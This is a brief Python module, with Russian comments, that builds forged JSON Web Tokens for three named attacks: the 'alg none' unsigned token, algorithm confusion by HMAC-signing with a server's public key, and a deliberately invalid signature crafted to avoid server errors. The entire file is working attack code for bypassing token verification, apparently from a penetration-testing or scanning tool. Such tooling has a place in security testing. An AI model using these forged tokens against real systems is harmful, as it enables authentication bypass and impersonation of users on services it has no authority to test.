import json
import base64
import hmac
import hashlib
from typing import Optional


def base64url_encode(data) -> str:
    """Кодирует в Base64Url (стандарт JWT) без padding'а"""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def sign_hmac_sha256(message: str, secret_key: str) -> str:
    key_bytes = (
        secret_key.encode("utf-8") if isinstance(secret_key, str) else secret_key
    )
    message_bytes = message.encode("utf-8")
    signature = hmac.new(key_bytes, message_bytes, hashlib.sha256).digest()
    return base64url_encode(signature)


def build_attack_jwt(
    header_dict: dict,
    payload_dict: dict,
    attack_type: str,
    public_key: Optional[str] = None,
) -> str:
    header_b64 = base64url_encode(json.dumps(header_dict, separators=(",", ":")))
    payload_b64 = base64url_encode(json.dumps(payload_dict, separators=(",", ":")))

    unsigned_token = f"{header_b64}.{payload_b64}"

    if attack_type == "alg_none":
        return f"{unsigned_token}."
    elif attack_type == "alg_confusion":
        if not public_key:
            raise ValueError("Для Algorithm Confusion нужен public_key!")
        sig_b64 = sign_hmac_sha256(unsigned_token, public_key)
        return f"{unsigned_token}.{sig_b64}"
    elif attack_type == "invalid":
        # ИСПРАВЛЕНИЕ: Мусорная подпись должна быть валидным Base64, чтобы не вызывать 500 ошибку
        fake_sig = base64url_encode("INVALID_SIGNATURE_123")
        return f"{unsigned_token}.{fake_sig}"
    else:
        raise ValueError(f"Неизвестный тип атаки: {attack_type}")
